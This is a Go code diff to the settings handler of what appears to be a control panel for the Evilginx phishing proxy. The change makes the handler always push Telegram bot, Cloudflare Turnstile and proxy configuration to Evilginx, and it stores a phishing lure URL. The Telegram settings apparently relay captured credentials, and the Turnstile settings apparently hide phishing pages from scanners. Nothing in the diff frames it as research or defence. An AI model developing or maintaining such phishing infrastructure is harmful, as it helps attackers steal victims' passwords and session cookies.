@@ -1827,39 +1827,40 @@ func handleSettings(w http.ResponseWriter, r *http.Request) {
 			return
 		}
 
-		// Update Telegram config in Evilginx if provided
-		if req.TelegramBotToken != "" || req.TelegramChatId != "" {
-			if err := updateTelegramConfig(req.TelegramBotToken, req.TelegramChatId); err != nil {
-				log.Printf("Failed to update Telegram config: %v", err)
-			}
+		// ALWAYS update configs to evilginx (to support clearing/disabling)
+		// Telegram: Always push to allow clearing credentials
+		if err := updateTelegramConfig(req.TelegramBotToken, req.TelegramChatId); err != nil {
+			log.Printf("Failed to update Telegram config: %v", err)
 		}
 
-		// Update Turnstile config in Evilginx if provided
-		if req.TurnstileSiteKey != "" || req.TurnstileSecretKey != "" || req.TurnstileEnabled != nil {
-			if err := updateTurnstileConfig(req.TurnstileSiteKey, req.TurnstileSecretKey, req.TurnstileEnabled); err != nil {
-				log.Printf("Failed to update Turnstile config: %v", err)
-			}
+		// Turnstile: Always push to allow clearing/disabling
+		if err := updateTurnstileConfig(req.TurnstileSiteKey, req.TurnstileSecretKey, req.TurnstileEnabled); err != nil {
+			log.Printf("Failed to update Turnstile config: %v", err)
 		}
 
-		// Update Proxy config in Evilginx if provided (applies immediately, no restart needed)
-		if req.ProxyType != "" || req.ProxyAddress != "" || req.ProxyPort > 0 || req.ProxyUsername != "" || req.ProxyPassword != "" || req.ProxyEnabled != nil {
-			proxyCfg := &ProxyConfig{
-				Type:     req.ProxyType,
-				Address:  req.ProxyAddress,
-				Port:     req.ProxyPort,
-				Username: req.ProxyUsername,
-				Password: req.ProxyPassword,
-			}
-			if req.ProxyEnabled != nil {
-				proxyCfg.Enabled = *req.ProxyEnabled
-			}
-			if err := updateProxyConfig(proxyCfg); err != nil {
-				log.Printf("Failed to update Proxy config: %v", err)
-				http.Error(w, fmt.Sprintf("Failed to apply proxy: %v", err), http.StatusInternalServerError)
-				return
-			}
+		// Proxy: Always push to allow clearing/disabling
+		proxyCfg := &ProxyConfig{
+			Type:     req.ProxyType,
+			Address:  req.ProxyAddress,
+			Port:     req.ProxyPort,
+			Username: req.ProxyUsername,
+			Password: req.ProxyPassword,
+		}
+		if req.ProxyEnabled != nil {
+			proxyCfg.Enabled = *req.ProxyEnabled
+		}
+		if err := updateProxyConfig(proxyCfg); err != nil {
+			log.Printf("Failed to update Proxy config: %v", err)
+			http.Error(w, fmt.Sprintf("Failed to apply proxy: %v", err), http.StatusInternalServerError)
+			return
 		}
 
+		// Legacy check (kept for backwards compatibility, but configs are always pushed above)
+		if false && (req.ProxyType != "" || req.ProxyAddress != "" || req.ProxyPort > 0 || req.ProxyUsername != "" || req.ProxyPassword != "" || req.ProxyEnabled != nil) {
+			// This block is now obsolete - config is always pushed above
+		}
+
+		// EvilFeed-only settings (not synced to evilginx)
 		if req.LureURL != "" {
 			db.Exec("INSERT OR REPLACE INTO settings (key, value) VALUES ('lure_url', ?)", req.LureURL)
 		}
